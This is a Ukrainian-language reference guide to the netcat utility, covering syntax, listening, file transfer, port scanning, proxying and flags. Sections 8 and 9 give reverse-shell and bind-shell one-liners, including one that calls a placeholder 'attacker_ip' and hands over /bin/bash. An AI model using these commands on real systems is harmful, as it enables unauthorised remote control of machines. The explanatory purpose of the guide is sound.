# Netcat (nc) — повна довідка

`Netcat` — це консольна мережева утиліта, яка дозволяє читати й записувати дані через з’єднання TCP або UDP. Її часто називають «швейцарським ножем TCP/IP» завдяки універсальності: інструмент використовується для діагностики мереж, передавання файлів, тестування портів і налагодження сервісів. Netcat популярна серед адміністраторів систем, розробників і фахівців із кібербезпеки. 

**Ключові факти**
**Розробник**: Hobbit (1995 р.), надалі відкриті реалізації GNU і OpenBSD

**Тип ПЗ**: мережева утиліта командного рядка

**Платформи**: Linux, BSD, macOS, Windows

**Ліцензія**: вільна (GNU Public License або BSD, залежно від версії)

**Команда запуску**: `nc` (скорочення від netcat)

**Принцип роботи**  
Netcat створює двосторонні сокет-з’єднання між хостами. Вона може працювати як клієнт (ініціювати підключення до порту) або як сервер (прослуховувати порт і приймати запити). Дані передаються безпосередньо між стандартними потоками вводу/виводу, що дозволяє легко поєднувати Netcat із іншими командними утилітами за допомогою конвеєрів.

**Основні можливості**  
Netcat підтримує відкриття TCP/UDP-з’єднань, сканування портів, простий обмін файлами, створення тимчасових серверів чи клієнтів, перенаправлення трафіку та тестування брандмауерів. У поєднанні з параметром `-l` утиліта очікує вхідних підключень, а опції `-p` та `-u` визначають порт і тип протоколу. Для сценаріїв безпеки можлива емуляція «bind» та «reverse shell» — лише у дозволених лабораторних умовах. 

**Варіанти й сумісність**  
Існує кілька реалізацій: GNU Netcat, OpenBSD Netcat (часто просто `nc`), а також Ncat — сучасна версія, інтегрована в пакет Nmap, із підтримкою SSL, проксі та розширених сценаріїв. У більшості Unix-систем Netcat доступна через стандартні менеджери пакунків, а для Windows — як виконуваний файл `nc.exe`. 

**Безпека та етика використання**  
Оскільки Netcat передає дані у відкритому вигляді, її не слід застосовувати в незахищених мережах без додаткового шифрування (наприклад, через SSH або OpenSSL). Утиліта може бути використана як у законних цілях адміністрування, так і зловмисно — тому важливо обмежувати доступ і дотримуватися правил етичного тестування безпеки.


## 1. Що таке netcat

`Netcat` (nc) — універсальна утиліта для роботи з TCP/UDP:

“швейцарський ніж для мереж”

📦 Вміє:

- відкривати TCP/UDP з’єднання
- слухати порти
- передавати файли
- сканувати порти
- дебажити сервіси
- створювати reverse shell
- проксувати трафік

## 2. Важливо: є різні реалізації

У Linux найчастіше:
| Версія          | Пакет                |
| --------------- | -------------------- |
| OpenBSD netcat  | `netcat-openbsd`     |
| GNU netcat      | `netcat-traditional` |
| Ncat (від Nmap) | `ncat`               |

👉 Ключі можуть трохи відрізнятись!

## 3. Базовий синтаксис
```bash
nc [OPTIONS] host port
```
або (режим слухання):
```bash
nc -l [OPTIONS] port
```

## 4. Основні режими роботи
### 4.1 Клієнт (підключення)
```bash
nc example.com 80
```
👉 відкриває TCP-з’єднання

### 4.2 Сервер (listen mode)
```bash
nc -l 1234
```
👉 слухає порт 1234

### 4.3 Двосторонній чат
сервер:
```bash
nc -l 1234
```
клієнт:
```bash
nc 192.168.1.10 1234
```

## 5. Передача файлів
📤 Відправка файлу
```bash
nc -l 1234 < file.txt
```
📥 Прийом
```bash
nc 192.168.1.10 1234 > file.txt
```

### 5.1 Через tar (каталог)
```bash
tar cf - folder | nc -l 1234
```
```bash
nc host 1234 | tar xf -
```

## 6. Сканування портів
```bash
nc -zv 192.168.1.1 20-100
```

- `-z` — без передачі даних
- `-v` — verbose

👉 альтернатива `nmap` (дуже базова)

## 7. UDP режим
```bash
nc -u 192.168.1.1 53
```
👉 для DNS, SNMP

## 8. Reverse shell (важливо ⚠️)
слухач:
```bash
nc -l 4444
```
клієнт:
```bash
nc attacker_ip 4444 -e /bin/bash
```
👉 дає shell

⚠️ у OpenBSD версії `-e` часто відключений

## 9. Bind shell
```bash
nc -l 4444 -e /bin/bash
```

## 10. Проксі / тунелювання
```bash
nc -l 8080 | nc target 80
```
👉 простий TCP relay

## 11. Відправка HTTP запиту
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

## 12. Таймаути
```bash
nc -w 5 host 80
```
👉 чекати 5 секунд

## 13. Всі основні ключі (детально)
🔑 Основні
| Ключ  | Опис               |
| ----- | ------------------ |
| `-l`  | listen mode        |
| `-p`  | порт               |
| `-v`  | verbose            |
| `-vv` | дуже детально      |
| `-n`  | без DNS            |
| `-z`  | scan mode          |
| `-u`  | UDP                |
| `-w`  | timeout            |
| `-i`  | delay між пакетами |
| `-q`  | час до закриття    |

🔐 З’єднання
| Ключ | Опис        |
| ---- | ----------- |
| `-4` | тільки IPv4 |
| `-6` | тільки IPv6 |
| `-s` | source IP   |
| `-p` | source port |

🎧 Listen режим
| Ключ | Опис                             |
| ---- | -------------------------------- |
| `-l` | слухати                          |
| `-k` | не закривати після 1 підключення |

⚙️ Дані
| Ключ | Опис                   |
| ---- | ---------------------- |
| `-e` | виконати програму      |
| `-c` | виконати shell команду |
| `-o` | hex dump               |

🔒 Безпека / розширення (часто в ncat)
| Ключ           | Опис       |
| -------------- | ---------- |
| `--ssl`        | SSL/TLS    |
| `--proxy`      | проксі     |
| `--proxy-type` | SOCKS/HTTP |

## 14. Практичні кейси
🔍 Перевірка порту
```bash
nc -zv google.com 443
```

🌐 Простий веб-сервер
```bash
while true; do
  echo -e "HTTP/1.1 200 OK\r\n\r\nHello" | nc -l 8080
done
```

📡 Debug сервера
```bash
nc localhost 25
```
👉 тест SMTP

🔐 Перевірка firewall
```bash
nc -zv 192.168.1.1 1-65535
```

## 15. Типові помилки

❌ `-e` не працює → OpenBSD версія  
❌ зависання → немає `-w`  
❌ DNS повільний → використовуй `-n`  
❌ UDP "не відповідає" → це нормально  

## 16. Безпека

Netcat часто використовується для:

- pentest
- reverse shell
- lateral movement

👉 тому:

- антивіруси можуть блокувати
- IDS/IPS можуть реагувати

## 17. nc vs ncat vs socat
| Інструмент | Особливість   |
| ---------- | ------------- |
| nc         | простий       |
| ncat       | SSL, проксі   |
| socat      | дуже потужний |

## 18. Best practices

✔ використовуй `-n` → швидше  
✔ додавай `-v` → бачиш що відбувається  
✔ для сканування → `-z`  
✔ для стабільності → `-w` 

## 19. Висновок

`Netcat` — це must-have для:

- адміністрування
- дебагу мереж
- security
